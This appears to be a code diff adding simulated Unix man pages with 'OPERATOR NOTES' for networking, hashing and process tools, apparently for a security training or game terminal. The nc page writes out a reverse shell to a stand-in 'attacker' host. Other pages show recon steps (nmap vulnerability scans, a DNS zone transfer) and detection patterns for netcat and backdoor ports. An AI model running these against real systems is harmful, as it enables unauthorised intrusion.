+       RS     The input record separator (default: newline).
+       $0     The entire input record.
+       $1-$n  The nth field of the current record.
+
+EXAMPLES
+       awk '{print $1}' file.txt
+              Print first field of each line.
+
+       awk -F: '{print $1, $3}' /etc/passwd
+              Print username and UID from passwd.
+
+       awk '/pattern/ {print}' file.txt
+              Print lines matching pattern.
+
+       awk '{sum += $1} END {print sum}' numbers.txt
+              Sum first column.
+
+       awk 'NR > 1 {print}' file.txt
+              Skip first line (header).
+
+OPERATOR NOTES
+       Use awk when you need to:
+       • Process structured data with complex field logic
+       • Perform calculations on columnar data
+       • Generate reports from logs or CSV files
+       • Transform data beyond simple search/replace
+
+       Pro tip: awk is a full programming language for text.
+       awk -F: '$3 >= 1000 {print $1}' /etc/passwd  # Users with UID >= 1000
+       awk '{print $NF}' file            # Print last field of each line
+       awk 'length > 80' file            # Lines longer than 80 chars
+       awk is more powerful than cut when you need logic or math.
+       When grep+cut isn't enough, awk is your answer.
+
+SEE ALSO
+       sed(1), grep(1), cut(1)`,
+
+            'tee': `TEE(1)                          User Commands                         TEE(1)
+
+NAME
+       tee - read from standard input and write to standard output and files
+
+SYNOPSIS
+       tee [OPTION]... [FILE]...
+
+DESCRIPTION
+       Copy standard input to each FILE, and also to standard output.
+
+       -a, --append
+              append to the given FILEs, do not overwrite
+
+       -i, --ignore-interrupts
+              ignore interrupt signals
+
+EXAMPLES
+       ls -la | tee output.txt
+              List files and save to output.txt.
+
+       command | tee -a log.txt
+              Append output to log file.
+
+       command | tee file1.txt file2.txt
+              Write to multiple files.
+
+OPERATOR NOTES
+       Use tee when you need to:
+       • Save command output while still viewing it
+       • Log operations for later review
+       • Write to multiple locations simultaneously
+       • Create audit trails of your commands
+
+       Pro tip: tee is essential for operational documentation.
+       ./exploit.sh | tee -a operation.log    # Log and watch
+       command | tee >(grep error > errors.txt)  # Process tee with pipe
+       Use sudo with tee: echo "text" | sudo tee /etc/file
+       This bypasses the "permission denied" on redirects.
+
+SEE ALSO
+       cat(1)`,
+
+            'xargs': `XARGS(1)                        User Commands                       XARGS(1)
+
+NAME
+       xargs - build and execute command lines from standard input
+
+SYNOPSIS
+       xargs [options] [command [initial-arguments]]
+
+DESCRIPTION
+       This manual page documents the GNU version of xargs.  xargs reads items
+       from the standard input, delimited by blanks or newlines, and executes
+       the command one or more times with any initial-arguments followed by
+       items read from standard input.
+
+       -0, --null
+              Input items are terminated by a null character instead of whitespace.
+
+       -I replace-str
+              Replace occurrences of replace-str in the initial-arguments.
+
+       -n max-args
+              Use at most max-args arguments per command line.
+
+       -p, --interactive
+              Prompt the user about whether to run each command.
+
+EXAMPLES
+       find . -name "*.txt" | xargs rm
+              Delete all .txt files.
+
+       find . -name "*.log" | xargs grep "error"
+              Search for "error" in all .log files.
+
+       cat files.txt | xargs -I {} cp {} /backup/
+              Copy each file listed to /backup/.
+
+OPERATOR NOTES
+       Use xargs when you need to:
+       • Execute commands on lists of files from find or other tools
+       • Batch process multiple items efficiently
+       • Work around "argument list too long" errors
+       • Build complex command pipelines
+
+       Pro tip: xargs is find's best friend. Essential patterns:
+       find . -name "*.log" -print0 | xargs -0 grep "error"  # Safe with spaces
+       cat hosts.txt | xargs -I {} ssh {} "uptime"  # Run on multiple hosts
+       find . -type f | xargs -n 1 md5sum  # Hash files one at a time
+       Use -print0 with -0 for filenames containing spaces or special chars.
+
+SEE ALSO
+       find(1), exec(3)`,
+
+            // Crypto
+            'base64': `BASE64(1)                       User Commands                      BASE64(1)
+
+NAME
+       base64 - base64 encode/decode data and print to standard output
+
+SYNOPSIS
+       base64 [OPTION]... [FILE]
+
+DESCRIPTION
+       Base64 encode or decode FILE, or standard input, to standard output.
+
+       -d, --decode
+              decode data
+
+       -i, --ignore-garbage
+              when decoding, ignore non-alphabet characters
+
+       -w, --wrap=COLS
+              wrap encoded lines after COLS character (default 76).
+              Use 0 to disable line wrapping.
+
+EXAMPLES
+       echo "Hello World" | base64
+              Encode string to base64.
+
+       echo "SGVsbG8gV29ybGQ=" | base64 -d
+              Decode base64 string.
+
+       base64 file.bin > file.b64
+              Encode binary file.
+
+OPERATOR NOTES
+       Use base64 when you need to:
+       • Decode obfuscated payloads in malware or scripts
+       • Encode binary data for transport over text protocols
+       • Analyze suspicious encoded strings in configs or logs
+       • Prepare data for web requests or APIs
+
+       Pro tip: Base64 is everywhere in malware and web attacks.
+       Look for it in: shell scripts, cron jobs, web shells, email headers.
+       Decode suspicious strings: echo "string" | base64 -d
+       Watch for double-encoding: base64 -d | base64 -d
+       Common in PowerShell attacks: -EncodedCommand uses base64.
+
+SEE ALSO
+       uuencode(1), uudecode(1)`,
+
+            'md5sum': `MD5SUM(1)                       User Commands                      MD5SUM(1)
+
+NAME
+       md5sum - compute and check MD5 message digest
+
+SYNOPSIS
+       md5sum [OPTION]... [FILE]...
+
+DESCRIPTION
+       Print or check MD5 (128-bit) checksums.
+
+       -b, --binary
+              read in binary mode
+
+       -c, --check
+              read MD5 sums from the FILEs and check them
+
+       -t, --text
+              read in text mode (default)
+
+       --quiet
+              don't print OK for each successfully verified file
+
+       --status
+              don't output anything, status code shows success
+
+       -w, --warn
+              warn about improperly formatted checksum lines
+
+EXAMPLES
+       md5sum file.txt
+              Print MD5 hash of file.
+
+       md5sum *.iso > checksums.md5
+              Create checksum file.
+
+       md5sum -c checksums.md5
+              Verify checksums.
+
+OPERATOR NOTES
+       Use md5sum when you need to:
+       • Verify file integrity (detect tampering)
+       • Create file fingerprints for comparison
+       • Check downloaded files against known hashes
+       • Identify known malware by hash signature
+
+       Pro tip: MD5 is fast but cryptographically broken - don't use
+       for security-critical applications. Still useful for:
+       • Quick file identification and deduplication
+       • Searching malware databases (VirusTotal accepts MD5)
+       • Verifying downloads match published hashes
+       Use sha256sum for security-sensitive verification.
+
+SEE ALSO
+       sha1sum(1), sha256sum(1), sha512sum(1)`,
+
+            'sha256sum': `SHA256SUM(1)                    User Commands                   SHA256SUM(1)
+
+NAME
+       sha256sum - compute and check SHA256 message digest
+
+SYNOPSIS
+       sha256sum [OPTION]... [FILE]...
+
+DESCRIPTION
+       Print or check SHA256 (256-bit) checksums.
+
+       -b, --binary
+              read in binary mode
+
+       -c, --check
+              read SHA256 sums from the FILEs and check them
+
+       --quiet
+              don't print OK for each successfully verified file
+
+       --status
+              don't output anything, status code shows success
+
+EXAMPLES
+       sha256sum file.iso
+              Print SHA256 hash of file.
+
+       sha256sum -c SHA256SUMS
+              Verify checksums from file.
+
+OPERATOR NOTES
+       Use sha256sum when you need to:
+       • Securely verify file integrity
+       • Generate cryptographic fingerprints for evidence
+       • Validate software downloads and updates
+       • Create forensic chain of custody records
+
+       Pro tip: SHA256 is the current standard for secure hashing.
+       Always use SHA256 (not MD5 or SHA1) for:
+       • Forensic evidence documentation
+       • Malware sample identification
+       • Verifying OS images and security tools
+       Document hashes before and after analysis to prove integrity.
+
+SEE ALSO
+       md5sum(1), sha1sum(1), sha512sum(1)`,
+
+            'sha1sum': `SHA1SUM(1)                      User Commands                     SHA1SUM(1)
+
+NAME
+       sha1sum - compute and check SHA1 message digest
+
+SYNOPSIS
+       sha1sum [OPTION]... [FILE]...
+
+DESCRIPTION
+       Print or check SHA1 (160-bit) checksums.
+
+       WARNING: SHA1 is no longer considered secure for cryptographic purposes.
+       Use SHA256 or SHA512 for security-critical applications.
+
+       -c, --check
+              read SHA1 sums from the FILEs and check them
+
+EXAMPLES
+       sha1sum file.txt
+              Print SHA1 hash of file.
+
+OPERATOR NOTES
+       Use sha1sum when you need to:
+       • Check legacy systems that still use SHA1
+       • Verify Git commit hashes (Git uses SHA1)
+       • Match older malware signatures or IOCs
+       • Compare against historical hash databases
+
+       Pro tip: SHA1 is DEPRECATED for security use (collision attacks
+       proven in 2017). However, you'll still encounter it:
+       • Git repositories use SHA1 for commits
+       • Older security tools and databases
+       • Legacy verification systems
+       Always prefer sha256sum for new verification tasks.
+
+SEE ALSO
+       md5sum(1), sha256sum(1)`,
+
+            'strings': `STRINGS(1)                      User Commands                     STRINGS(1)
+
+NAME
+       strings - print the sequences of printable characters in files
+
+SYNOPSIS
+       strings [options] file...
+
+DESCRIPTION
+       For each file given, GNU strings prints the printable character
+       sequences that are at least 4 characters long and are followed by
+       an unprintable character.
+
+       -a, --all
+              Scan the whole file, regardless of what sections it contains.
+
+       -n min-len, --bytes=min-len
+              Print sequences of at least min-len characters (default 4).
+
+       -t radix, --radix=radix
+              Print the offset within the file before each string.
+
+EXAMPLES
+       strings /bin/ls
+              Extract readable strings from binary.
+
+       strings -n 8 malware.bin
+              Find strings at least 8 characters long.
+
+       strings -t x binary
+              Show hex offset of each string.
+
+OPERATOR NOTES
+       Use strings when you need to:
+       • Extract readable text from binary files or memory dumps
+       • Find hardcoded credentials, URLs, or IPs in executables
+       • Identify malware capabilities from embedded strings
+       • Reverse engineer unknown binaries
+
+       Pro tip: strings is your first tool for binary analysis.
+       Look for: URLs, IP addresses, file paths, error messages,
+       function names, registry keys, command strings.
+       strings malware.exe | grep -E "(http|password|cmd|admin)"
+       Combine with grep for targeted hunting. Use -t x to find
+       string locations for deeper analysis with hex editors.
+
+SEE ALSO
+       nm(1), objdump(1)`,
+
+            // Security/Network
+            'nmap': `NMAP(1)                     Nmap Reference Guide                     NMAP(1)
+
+NAME
+       nmap - Network exploration tool and security / port scanner
+
+SYNOPSIS
+       nmap [Scan Type...] [Options] {target specification}
+
+DESCRIPTION
+       Nmap ("Network Mapper") is a free and open source utility for network
+       discovery and security auditing.
+
+       -sS    TCP SYN scan (default, requires root)
+       -sT    TCP connect scan
+       -sU    UDP scan
+       -sV    Probe open ports to determine service/version info
+       -sC    Perform a script scan using the default set of scripts
+       -O     Enable OS detection
+       -A     Enable OS detection, version detection, script scanning, and traceroute
+
+       -p port ranges
+              Only scan specified ports. Ex: -p22; -p1-65535; -p U:53,T:21-25
+
+       -p-    Scan all 65535 ports
+
+       -Pn    Treat all hosts as online -- skip host discovery
+
+       -v     Increase verbosity level
+
+       -oN/-oX/-oS/-oG <file>
+              Output scan in normal, XML, s|<rIpt kIddi3, and Grepable format
+
+EXAMPLES
+       nmap 192.168.1.1
+              Basic scan of single host.
+
+       nmap -sV -p 1-1000 target.com
+              Version detection on ports 1-1000.
+
+       nmap -A -T4 scanme.nmap.org
+              Aggressive scan with faster timing.
+
+       nmap -sn 192.168.1.0/24
+              Ping scan to discover hosts.
+
+OPERATOR NOTES
+       Use nmap when you need to:
+       • Discover live hosts on a network segment
+       • Enumerate open ports and running services
+       • Identify operating systems and service versions
+       • Find potential vulnerabilities and entry points
+
+       Pro tip: Nmap is THE network reconnaissance tool. Master this workflow:
+       1. nmap -sn 192.168.1.0/24         # Host discovery first
+       2. nmap -sV -sC -p- target         # Full port scan + scripts
+       3. nmap --script vuln target       # Vulnerability scan
+
+       Use -oA basename to save all output formats simultaneously.
+       NSE scripts (--script) extend nmap into a vulnerability scanner.
+       Always get authorization before scanning networks you don't own.
+
+SEE ALSO
+       https://nmap.org/book/man.html`,
+
+            'nc': `NC(1)                         BSD General Commands Manual                        NC(1)
+
+NAME
+     nc -- arbitrary TCP and UDP connections and listens
+
+SYNOPSIS
+     nc [-46DdhklnrStUuvz] [-i interval] [-p source_port] [-s source_ip_address]
+        [-w timeout] [-X proxy_protocol] [-x proxy_address[:port]]
+        [hostname] [port[s]]
+
+DESCRIPTION
+     The nc (or netcat) utility is used for just about anything under the sun
+     involving TCP or UDP.  It can open TCP connections, send UDP packets,
+     listen on arbitrary TCP and UDP ports, do port scanning, and deal with
+     both IPv4 and IPv6.
+
+     -l      Listen for an incoming connection rather than initiating one.
+
+     -p source_port
+             Specify the source port nc should use.
+
+     -u      Use UDP instead of the default TCP.
+
+     -v      Produce more verbose output.
+
+     -z      Only scan for listening daemons, without sending any data.
+
+     -w timeout
+             Connections which cannot be established timeout after timeout seconds.
+
+EXAMPLES
+     nc -l 1234
+             Listen on port 1234.
+
+     nc host.example.com 80
+             Connect to port 80 of host.example.com.
+
+     echo "GET /" | nc host.example.com 80
+             Send HTTP request.
+
+     nc -zv host.example.com 20-30
+             Port scan ports 20-30.
+
+OPERATOR NOTES
+     Use nc (netcat) when you need to:
+     • Create quick TCP/UDP connections for testing
+     • Set up listeners to receive incoming connections
+     • Transfer files between systems without scp
+     • Debug network services by hand-crafting requests
+
+     Pro tip: Netcat is the "Swiss Army knife" of networking.
+     Reverse shell:    nc -e /bin/sh attacker 4444  (on target)
+                       nc -lvp 4444                  (on attacker)
+     File transfer:    nc -l 1234 > received.txt   (receiver)
+                       nc target 1234 < send.txt   (sender)
+     Banner grab:      echo "" | nc -v target 22
+     Port check:       nc -zv target 22 80 443
+
+SEE ALSO
+     cat(1), ssh(1), nmap(1)`,
+
+            'netcat': `NETCAT(1)                   BSD General Commands Manual                   NETCAT(1)
+
+NAME
+     netcat -- see nc(1)
+
+DESCRIPTION
+     netcat is an alias for nc. See nc(1) for full documentation.
+
+SEE ALSO
+     nc(1)`,
+
+            'tcpdump': `TCPDUMP(1)                      User Commands                     TCPDUMP(1)
+
+NAME
+       tcpdump - dump traffic on a network
+
+SYNOPSIS
+       tcpdump [ -AbdDefhHIJKlLnNOpqStuUvxX# ] [ -B buffer_size ]
+               [ -c count ] [ -C file_size ] [ -G rotate_seconds ]
+               [ -i interface ] [ -w file ] [ -r file ]
+               [ expression ]
+
+DESCRIPTION
+       Tcpdump prints out a description of the contents of packets on a
+       network interface that match the boolean expression.
+
+       -c count
+              Exit after receiving count packets.
+
+       -i interface
+              Listen on interface. If unspecified, tcpdump searches the system
+              interface list for the lowest numbered, configured up interface.
+
+       -n     Don't convert addresses to names.
+
+       -nn    Don't convert protocol and port numbers to names.
+
+       -v     Verbose output. For example, the time to live, identification,
+              total length and options in an IP packet are printed.
+
+       -w file
+              Write the raw packets to file rather than printing them out.
+
+       -r file
+              Read packets from file (which was created with the -w option).
+
+EXPRESSION
+       Selects which packets will be dumped. Examples:
+       host hostname    - packets to or from hostname
+       port 80          - packets to or from port 80
+       tcp              - TCP packets only
+       src host         - packets from host
+       dst port 443     - packets to port 443
+
+EXAMPLES
+       tcpdump -i eth0
+              Capture on eth0 interface.
+
+       tcpdump -c 100 -w capture.pcap
+              Capture 100 packets to file.
+
+       tcpdump port 80 or port 443
+              Capture HTTP and HTTPS traffic.
+
+       tcpdump -n host 192.168.1.1
+              Traffic to/from specific IP.
+
+OPERATOR NOTES
+       Use tcpdump when you need to:
+       • Capture network traffic for analysis
+       • Monitor for suspicious connections in real-time
+       • Create packet captures for Wireshark analysis
+       • Debug network connectivity issues
+
+       Pro tip: tcpdump requires root/sudo for raw packet capture.
+       Capture to file for later analysis:
+       tcpdump -i any -w evidence.pcap -c 10000
+
+       Hunt for suspicious traffic:
+       tcpdump 'tcp[tcpflags] & (tcp-syn) != 0'  # SYN packets
+       tcpdump 'port 4444 or port 5555'          # Common backdoor ports
+       tcpdump -A 'port 80'                       # ASCII HTTP content
+       Always use -w for evidence - pcap files preserve everything.
+
+SEE ALSO
+       wireshark(1), tshark(1)`,
+
+            'whois': `WHOIS(1)                        User Commands                       WHOIS(1)
+
+NAME
+       whois - client for the whois directory service
+
+SYNOPSIS
+       whois [OPTION]... OBJECT...
+
+DESCRIPTION
+       whois searches for an object in a RFC 3912 database.
+
+       -h HOST, --host HOST
+              Connect to HOST.
+
+       -p PORT, --port PORT
+              Connect to PORT.
+
+EXAMPLES
+       whois example.com
+              Query domain information.
+
+       whois 8.8.8.8
+              Query IP address information.
+
+       whois -h whois.arin.net 8.8.8.8
+              Query specific whois server.
+
+OPERATOR NOTES
+       Use whois when you need to:
+       • Identify domain ownership and registration details
+       • Find IP address allocation and organization info
+       • Research infrastructure during OSINT gathering
+       • Investigate suspicious domains or IPs
+
+       Pro tip: WHOIS is essential for OSINT and attribution.
+       Key information to look for:
+       • Registrant name, email, organization
+       • Name servers (reveal hosting infrastructure)
+       • Creation/expiration dates (new domains are suspicious)
+       • Abuse contact for reporting
+
+       Many domains use privacy protection - check historical
+       WHOIS records at archive services for original data.
+
+SEE ALSO
+       dig(1), nslookup(1)`,
+
+            'dig': `DIG(1)                         BIND9                                  DIG(1)
+
+NAME
+       dig - DNS lookup utility
+
+SYNOPSIS
+       dig [@server] [-b address] [-c class] [-f filename] [-k filename]
+           [-m] [-p port#] [-q name] [-t type] [-v] [-x addr]
+           [-y [hmac:]name:key] [name] [type] [class] [queryopt...]
+
+DESCRIPTION
+       dig is a flexible tool for interrogating DNS name servers.
+
+       -x addr
+              Simplified reverse lookups.
+
+       @server
+              DNS server to query.
+
+       +short
+              Display only the answer.
+
+       +trace
+              Trace the delegation path.
+
+EXAMPLES
+       dig example.com
+              Query A record.
+
+       dig example.com MX
+              Query MX records.
+
+       dig @8.8.8.8 example.com
+              Query specific DNS server.
+
+       dig -x 8.8.8.8
+              Reverse lookup.
+
+       dig +short example.com
+              Short answer only.
+
+OPERATOR NOTES
+       Use dig when you need to:
+       • Resolve domain names to IP addresses
+       • Enumerate DNS records (A, AAAA, MX, NS, TXT, CNAME)
+       • Trace DNS delegation chains
+       • Verify DNS configuration and propagation
+
+       Pro tip: dig is more powerful than nslookup for DNS recon.
+       dig example.com ANY          # All records (if allowed)
+       dig example.com TXT          # Often contains SPF, DKIM, verification
+       dig +trace example.com       # Full delegation path
+       dig -x IP                    # Reverse lookup (PTR record)
+       dig @ns1.example.com example.com axfr  # Zone transfer attempt
+
+SEE ALSO
+       nslookup(1), host(1)`,
+
+            'nslookup': `NSLOOKUP(1)                      BIND9                           NSLOOKUP(1)
+
+NAME
+       nslookup - query Internet name servers interactively
+
+SYNOPSIS
+       nslookup [-option] [name | -] [server]
+
+DESCRIPTION
+       Nslookup is a program to query Internet domain name servers.
+
+EXAMPLES
+       nslookup example.com
+              Query default DNS server.
+
+       nslookup example.com 8.8.8.8
+              Query specific DNS server.
+
+       nslookup -type=mx example.com
+              Query MX records.
+
+       nslookup -type=ns example.com
+              Query name servers.
+
+OPERATOR NOTES
+       Use nslookup when you need to:
+       • Quickly resolve hostnames to IPs
+       • Check DNS server responses
+       • Query specific record types
+       • Troubleshoot DNS resolution issues
+
+       Pro tip: nslookup is simpler than dig but less powerful.
+       Use for quick lookups; prefer dig for detailed analysis.
+       nslookup -type=any domain.com   # All records
+       Interactive mode: just type 'nslookup' then enter queries.
+       For serious DNS recon, use dig instead.
+
+SEE ALSO
+       dig(1), host(1)`,
+
+            'ping': `PING(8)                     System Manager's Manual                    PING(8)
+
+NAME
+       ping - send ICMP ECHO_REQUEST to network hosts
+
+SYNOPSIS
+       ping [-aAbBdDfhLnOqrRUvV46] [-c count] [-i interval] [-I interface]
+            [-m mark] [-M pmtudisc_option] [-l preload] [-p pattern]
+            [-Q tos] [-s packetsize] [-S sndbuf] [-t ttl]
+            [-T timestamp option] [-w deadline] [-W timeout] [hop...]
+            {destination}
+
+DESCRIPTION
+       ping uses the ICMP protocol's ECHO_REQUEST datagram to elicit an
+       ICMP ECHO_RESPONSE from a host or gateway.
+
+       -c count
+              Stop after sending count ECHO_REQUEST packets.
+
+       -i interval
+              Wait interval seconds between sending each packet.
+
+       -s packetsize
+              Specifies the number of data bytes to be sent.
+
+       -t ttl
+              Set the IP Time to Live.
+
+       -W timeout
+              Time to wait for a response, in seconds.
+
+EXAMPLES
+       ping google.com
+              Ping continuously.
+
+       ping -c 4 192.168.1.1
+              Send 4 pings.
+
+       ping -i 0.5 -c 10 host
+              Ping 10 times, 0.5s interval.
+
+OPERATOR NOTES
+       Use ping when you need to:
+       • Test basic network connectivity to a host
+       • Verify a host is alive and responding
+       • Measure round-trip latency
+       • Troubleshoot network path issues
+
+       Pro tip: ping is your first network diagnostic tool.
+       No response could mean: host down, firewall blocking ICMP,
+       or routing issues. Check with other tools if ping fails.
+       ping -c 1 -W 1 host && echo "up" || echo "down"  # Quick check
+       Some networks block ICMP - try nmap -sn for host discovery.
+
+SEE ALSO
+       traceroute(8), netstat(8)`,
+
+            // System
+            'ps': `PS(1)                           User Commands                          PS(1)
+
+NAME
+       ps - report a snapshot of the current processes
+
+SYNOPSIS
+       ps [options]
+
+DESCRIPTION
+       ps displays information about a selection of the active processes.
+
+SIMPLE PROCESS SELECTION
+       a      Select all processes with a tty.
+       -A, -e Select all processes.
+       -a     Select all except session leaders and not associated with terminal.
+       x      Select processes without controlling ttys.
+
+OUTPUT FORMAT CONTROL
+       u      Display user-oriented format.
+       -f     Full-format listing.
+       -l     Long format.
+
+EXAMPLES
+       ps aux
+              Show all processes for all users.
+
+       ps -ef
+              Full format listing of all processes.
+
+       ps aux | grep nginx
+              Find nginx processes.
+
+       ps -u username
+              Show processes for specific user.
+
+OPERATOR NOTES
+       Use ps when you need to:
+       • List all running processes on a system
+       • Find suspicious or malicious processes
+       • Identify resource-heavy applications
+       • Locate process IDs for killing or analysis
+
+       Pro tip: ps aux is your process reconnaissance command.
+       Look for: unusual process names, processes running as root,
+       high CPU/memory consumers, scripts running from /tmp.
+       ps aux | grep -E "(nc|ncat|netcat|perl|python)" # Suspicious
+       ps auxf  # Show process tree (parent-child relationships)
+       ps -eo pid,user,cmd --sort=-%mem | head  # Top memory users
+
+SEE ALSO
+       top(1), pgrep(1), kill(1)`,
+
+            'top': `TOP(1)                          User Commands                         TOP(1)
+
+NAME
+       top - display Linux processes
+
+SYNOPSIS
+       top -hv|-bcEeHiOSs1 -d secs -n max -u|U user -p pids -o field -w [cols]
+
+DESCRIPTION
+       The  top  program  provides  a dynamic real-time view of a running
+       system.  It can display system summary information as well as a list
+       of processes or threads currently being managed by the Linux kernel.
+
+INTERACTIVE COMMANDS
+       k      Kill a process (prompts for PID and signal).
+       r      Renice a process (change priority).
+       q      Quit.
+       h      Help.
+       M      Sort by memory usage.
+       P      Sort by CPU usage.
+       N      Sort by PID.
+       T      Sort by time.
+
+EXAMPLES
+       top
+              Interactive process viewer.
+
+       top -b -n 1
+              Batch mode, one iteration.
+
+       top -u username
+              Show only user's processes.
+
+OPERATOR NOTES
+       Use top when you need to:
+       • Monitor system resources in real-time
+       • Identify CPU/memory-hungry processes
+       • Watch for cryptocurrency miners or resource abuse
+       • Investigate system performance issues
+
+       Pro tip: top reveals system health at a glance.
+       Watch the load average (should be < number of CPUs).
+       Press 'c' to show full command lines.
+       Press '1' to show individual CPU cores.
+       High %wa (I/O wait) suggests disk bottleneck.
+       Cryptominers often max out CPU - look for unknown processes
+       consuming 100% CPU with generic names.
+
+SEE ALSO
+       ps(1), htop(1), kill(1)`,
+
+            'kill': `KILL(1)                         User Commands                        KILL(1)
+
+NAME
+       kill - send a signal to a process
+
+SYNOPSIS
+       kill [options] <pid> [...]
+
+DESCRIPTION
+       The default signal for kill is TERM.
+
+       -s signal
+              Specify the signal to be sent.
+
+       -l, --list [signal]
+              List signal names.
+
+       -9     Send SIGKILL (cannot be caught or ignored).
+
+       -15    Send SIGTERM (default, allows graceful shutdown).
+
+SIGNALS
+       1      HUP     Hangup
+       2      INT     Interrupt
+       9      KILL    Kill (cannot be caught)
+       15     TERM    Terminate (default)
+       18     CONT    Continue if stopped
+       19     STOP    Stop process
+
+EXAMPLES
+       kill 1234
+              Send SIGTERM to process 1234.
+
+       kill -9 1234
+              Force kill process 1234.
+
+       kill -l
+              List all signal names.
+
+       kill -HUP $(cat /var/run/nginx.pid)
+              Send HUP to nginx.
+
+OPERATOR NOTES
+       Use kill when you need to:
+       • Terminate malicious or runaway processes
+       • Stop miners, backdoors, or reverse shells
+       • Gracefully restart services (HUP)
+       • Force-stop unresponsive applications
+
+       Pro tip: Start with SIGTERM (default), escalate to SIGKILL (-9).
+       kill PID        # Ask nicely first
+       kill -9 PID     # Force kill if that fails
+
+       pkill and killall are useful alternatives:
+       pkill -f "crypto"     # Kill by command name pattern
+       killall python        # Kill all python processes
+
+       Be careful - killing critical processes can crash the system.
+
+SEE ALSO
+       pkill(1), killall(1), ps(1), signal(7)`,
+
+            'chmod': `CHMOD(1)                        User Commands                       CHMOD(1)
+
+NAME
+       chmod - change file mode bits
+
+SYNOPSIS
+       chmod [OPTION]... MODE[,MODE]... FILE...
+       chmod [OPTION]... OCTAL-MODE FILE...
+
+DESCRIPTION
+       chmod changes the file mode bits of each given file according to mode.
+
+       Numeric mode uses octal numbers:
+       4 = read (r)
+       2 = write (w)
+       1 = execute (x)
+
+       Symbolic mode uses letters:
+       u = user/owner
+       g = group
+       o = others
+       a = all
+
+       + = add permission
+       - = remove permission
+       = = set exact permission
+
+EXAMPLES
+       chmod 755 script.sh
+              rwxr-xr-x (owner: rwx, group: rx, others: rx)
+
+       chmod 644 file.txt
+              rw-r--r-- (owner: rw, group: r, others: r)
+
+       chmod +x script.sh
+              Add execute permission for all.
+
+       chmod u+x,g-w file
+              Add execute for owner, remove write for group.
+
+       chmod -R 755 directory/
+              Recursively change permissions.
+
+OPERATOR NOTES
+       Use chmod when you need to:
+       • Make scripts executable
+       • Secure sensitive files (restrict access)
+       • Fix permission issues
+       • Identify permission-based vulnerabilities
+
+       Pro tip: Memorize these common permission sets:
+       755 - Executables, scripts (rwxr-xr-x)
+       644 - Regular files (rw-r--r--)
+       600 - Private files like keys (rw-------)
+       777 - DANGER! World-writable (never use in production)
+
+       Security check: find / -perm -o+w  # World-writable files
+       SUID bit (4xxx): chmod 4755 file  # Runs as file owner (dangerous)
+
+SEE ALSO
+       chown(1), chgrp(1), stat(1)`,
+
+            'chown': `CHOWN(1)                        User Commands                       CHOWN(1)
+
+NAME
+       chown - change file owner and group
+
+SYNOPSIS
+       chown [OPTION]... [OWNER][:[GROUP]] FILE...
+
+DESCRIPTION
+       chown changes the user and/or group ownership of each given file.
+
+       -R, --recursive
+              operate on files and directories recursively
+
+       -v, --verbose
+              output a diagnostic for every file processed
+
+EXAMPLES
+       chown root file.txt
+              Change owner to root.
+
+       chown root:admin file.txt
+              Change owner to root, group to admin.
+
+       chown :developers file.txt
+              Change only the group.
+
+       chown -R www-data:www-data /var/www
+              Recursively change ownership.
+
+OPERATOR NOTES
+       Use chown when you need to:
+       • Change file ownership after copying or creating files
+       • Fix ownership issues on web directories
+       • Transfer file ownership between users
+       • Investigate unusual file ownership patterns
+
+       Pro tip: chown requires root for changing to other users.
+       Common ownership patterns to know:
+       www-data:www-data  - Web server files (Apache/Nginx)
+       root:root          - System files
+       mysql:mysql        - Database files
+
+       Suspicious: files in /tmp owned by root, or user files
+       owned by www-data may indicate web shell activity.
+       find / -user www-data -type f 2>/dev/null  # Web server's files
+
+SEE ALSO
+       chmod(1), chgrp(1)`,
+
+            // Network
+            'ifconfig': `IFCONFIG(8)             System Manager's Manual            IFCONFIG(8)
+
+NAME
+       ifconfig - configure a network interface
+
+SYNOPSIS
+       ifconfig [-v] [-a] [-s] [interface]
+       ifconfig [-v] interface [aftype] options | address ...
+
+DESCRIPTION
+       Ifconfig is used to configure the kernel-resident network interfaces.
+
+       Note: This program is obsolete! For replacement check ip addr and ip link.
+
+EXAMPLES
+       ifconfig
+              Display all active interfaces.
+
+       ifconfig -a
+              Display all interfaces including inactive.
+
+       ifconfig eth0
+              Display specific interface.
+
+       ifconfig eth0 up
+              Bring interface up.
+
+       ifconfig eth0 192.168.1.10 netmask 255.255.255.0
+              Set IP address.
+
+SEE ALSO
+       ip(8), route(8), netstat(8)`,
+
+            'ip': `IP(8)                          Linux                                  IP(8)
+
+NAME
+       ip - show / manipulate routing, network devices, interfaces and tunnels
+
+SYNOPSIS
+       ip [ OPTIONS ] OBJECT { COMMAND | help }
+
+OBJECTS
+       address  - protocol (IP or IPv6) address on a device.
+       link     - network device.
+       route    - routing table entry.
+       neigh    - ARP or NDISC cache entry.
+
+EXAMPLES
+       ip addr
+              Show all addresses.
+
+       ip addr show eth0
+              Show addresses for eth0.
+
+       ip link show
+              Show all interfaces.
+
+       ip route
+              Show routing table.
+
+       ip neigh
+              Show ARP cache.
+
+       ip addr add 192.168.1.10/24 dev eth0
+              Add IP address to interface.
+
+SEE ALSO
+       ifconfig(8), route(8)`,
+
+            'netstat': `NETSTAT(8)              System Manager's Manual             NETSTAT(8)
+
+NAME
+       netstat - Print network connections, routing tables, interface statistics
+
+SYNOPSIS
+       netstat  [address_family_options]  [--tcp|-t]  [--udp|-u]  [--raw|-w]
+                [--listening|-l]  [--all|-a]  [--numeric|-n]  [--program|-p]
+
+DESCRIPTION
+       Note: This program is mostly obsolete.  Replacement for netstat is ss.
+
+       -a, --all
+              Show both listening and non-listening sockets.
+
+       -l, --listening
+              Show only listening sockets.
+
+       -n, --numeric
+              Show numerical addresses instead of resolving hosts.
+
+       -p, --program
+              Show the PID and name of the program.
+
+       -t, --tcp
+              Show TCP connections.
+
+       -u, --udp
+              Show UDP connections.
+
+       -r, --route
+              Display the kernel routing tables.
+
+EXAMPLES
+       netstat -tuln
+              Show TCP/UDP listening ports numerically.
+
+       netstat -anp
+              Show all connections with process info.
+
+       netstat -r
+              Show routing table.
+
+SEE ALSO
+       ss(8), ip(8), route(8)`,
+
+            'ss': `SS(8)                          Linux                                  SS(8)
+
+NAME
+       ss - another utility to investigate sockets
+
+SYNOPSIS
+       ss [options] [ FILTER ]
+
+DESCRIPTION
+       ss is used to dump socket statistics. It allows showing information
+       similar to netstat. It can display more TCP and state information.
+
+       -a, --all
+              Display all sockets.
+
+       -l, --listening
+              Display listening sockets.
+
+       -n, --numeric
+              Do not try to resolve service names.
+
+       -p, --processes
+              Show process using socket.
+
+       -t, --tcp
+              Display TCP sockets.
+
+       -u, --udp
+              Display UDP sockets.
+
+EXAMPLES
+       ss -tuln
+              Show TCP/UDP listening sockets.
+
+       ss -anp
+              Show all sockets with process info.
+
+       ss state established
+              Show established connections.
+
+SEE ALSO
+       netstat(8), ip(8)`,
+
+            // Services
